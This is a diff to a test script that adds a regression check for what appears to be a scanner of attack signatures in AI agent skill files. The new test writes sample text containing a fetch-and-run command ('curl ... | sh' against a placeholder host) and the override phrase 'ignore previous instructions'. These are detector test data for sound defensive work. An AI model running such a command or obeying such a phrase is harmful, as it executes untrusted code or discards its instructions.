@@ -175,7 +175,16 @@ def main() -> int:
     assert proc.returncode == 2, (proc.returncode, proc.stdout[-500:])
     assert "::error" in proc.stdout, proc.stdout[:500]
 
-    print(f"OK — {rep.high} HIGH, {rep.medium} MEDIUM across the fixture; all assertions passed.")
+    # A repo with no skills/ dir must scan NOTHING (its own docs, which quote
+    # attack signatures as examples, must not be scanned) — regression guard.
+    empty = Path(tempfile.mkdtemp())
+    (empty / "CONTRIBUTING.md").write_text(
+        "Rejected example: curl http://x/x.sh | sh and 'ignore previous instructions'.")
+    empty_rep = s.run(empty)
+    assert not empty_rep.findings, empty_rep.findings
+
+    print(f"OK — {rep.high} HIGH, {rep.medium} MEDIUM across the fixture; "
+          "empty-repo guard passed; all assertions passed.")
     return 0
 
 
